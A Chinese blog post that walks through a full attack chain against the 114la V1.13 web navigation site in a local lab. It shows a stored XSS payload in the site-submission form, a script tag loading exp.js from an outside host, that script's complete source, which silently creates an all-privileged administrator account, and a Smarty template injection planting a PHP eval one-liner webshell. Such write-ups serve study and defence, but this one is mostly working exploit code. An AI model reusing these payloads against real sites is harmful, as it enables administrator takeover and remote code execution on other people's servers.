---
title: 114啦-V1.13导航站Getshell
author: 简文涛
categories:
  - Web
tags:
  - 漏洞利用
comments: true
top: false
abbrlink: 31062
summary: 114啦是一个老牌的网址导航站，采用php+Mysql架构，基于Smarty模板引擎。V1.13中包含XSS漏洞，可以利用来Getshell。
img: 'https://i.loli.net/2020/06/06/7noqPmHLlBfIA4S.jpg'
date: 2020-06-06 18:40:02
updated:
permalink:
---

114啦是一个老牌的网址导航站，采用php+Mysql架构，基于Smarty模板引擎。V1.13中包含XSS漏洞，可以利用来Getshell。

## 环境搭建

### 源码下载地址

下载链接：https://jwt1399.lanzous.com/i06ZIde662b

### 安装

1.把下好的`114啦`源码文件`114la`放到`phpStudy`的`WWW`目录下

2.访问地址：`http://localhost/114la/upload/install/` 选择全新安装,就会进入到安装界面,按照提示配置好参数，注意数据库用户名和密码要与你的mysql匹配，安装之后将自动删除install目录

3.进入后台设置您的管理信息，并在“静态生成”->“一键生成”生成相应的页面

4.再访问：`http://localhost/114la/upload/index.htm`，可以看到导航页面了

## XSS漏洞利用

**XSS漏洞点：**`url-submit/index.php`

```php
//18-22行
$name = (empty($_POST['name'])) ? '' : strip($_POST['name']);
        if (empty($name))
        {
            throw new Exception('网站名称不能为空', 10);
        }
//91-94行
$info = $_POST;
$infos = addslashes(serialize($info));
app_db::insert('ylmf_urladd', array('domain', 'info', 'addtime'), array($domain, $infos, time()));
```

对提交的数据只使用`addslashes`函数在引号前面添加`\`,使用`serialize`函数序列化输入的信息，未做其他过滤，直接插入数据库,造成了存储型XSS漏洞

在网站名称那一栏插入`JS`,其它的符合要求填写就可以了，然后提交

```js
<script>alert(123)</script>;
```

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607160047.png)

查看数据库，看到JS代码确实插入到了数据库中

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607160242.png)

当管理员在后台访问收录管理时，注入的JS代码就会执行，可以看到成功弹框

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607160053.png)



既然JS代码能够成功执行，那我们插入一个添加管理员账户的远程JS文件,等待管理员查看网站收录审核的时候就会执行JS文件，从而创建一个管理员账号，后续我们进入后台来Getshell

```
<script src=http://192.168.1.109/exp.js></script>;
```

`exp.js`用来创建一个用户名密码为`jwt/abc123`的管理员

 ```javascript
var siteurl = document.URL;
siteurl = siteurl.replace(/(.*\/){0,}([^\.]+).*/ig,"$1");
var username="jwt";//用户名
var password="abc123";//密码
var request = false;
 
if(window.XMLHttpRequest) {
	request = new XMLHttpRequest();
	if(request.overrideMimeType) {
		request.overrideMimeType('text/xml');
	}
} else if(window.ActiveXObject) {
    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
	for(var i=0; i<versions.length; i++) {
		try {
			request = new ActiveXObject(versions[i]);
			} catch(e){}
	}
}
 
var xmlhttp=request;
 
xmlhttp.open("GET",siteurl+"/index.php?c=member", false);
xmlhttp.setRequestHeader("Referer", siteurl);
xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
xmlhttp.send();
if (xmlhttp.responseText.indexOf(username)<0) {
xmlhttp.open("POST", siteurl + "/index.php?c=member&a=member_add", false);
xmlhttp.setRequestHeader("Referer", siteurl);
xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send("name=" + username + "&password=" + password + "&step=2");
xmlhttp.open("POST", siteurl + "/index.php?c=member&a=member_edit", false);
xmlhttp.setRequestHeader("Referer", siteurl);
xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xmlhttp.send("auth%5Bmember114laurl_add114lafeedback%5D=1&auth%5Bconfig114la%5D=1&auth%5Bfamous_nav114lafamous_loop_playfamous_nav_tab114laindex_site114laindex_tool114lamztopl114larecycler%5D=1&auth%5Bzhuanti114lazhuanti_class%5D=1&auth%5Badvise_index114lakey%5D=1&auth%5Bbackup114larestore114larepair114laclear114lamysites%5D=1&auth%5Btemplate_manage%5D=1&auth%5Bmake_html114la%5D=1&auth%5Bheader114lamenu114lawelcome114laframe114lalogin%5D=1&auth%5Bsecurity114la%5D=1&auth%5Bsite_manage%5D=1&auth%5Bplan%5D=1&auth%5Bclass%5D=1&auth%5Blog%5D=1&step=2&name=" + username);
}
 ```

我们自己模拟管理员进后台查看收录管理一下，然后去用户管理中查看是否新建了jwt用户

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607164030.png)

不出所料，果然成功创建了jwt管理员

## Getshell

由于114la网站使用的smarty模板引擎,而smarty支持插入php代码,这样就会导致漏洞产生了

> **smarty里面执行PHP代码 :** `<{php}>代码<{/php}>`

那我们登录jwt用户,进入模板管理->申请收录版块->插入PHP一句话木马

```php
<{php}>@eval($_POST['a']);<{/php}> 
```

然后我们用🐜🗡连接，到这里我们就成功Getshell了

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607164003.png)



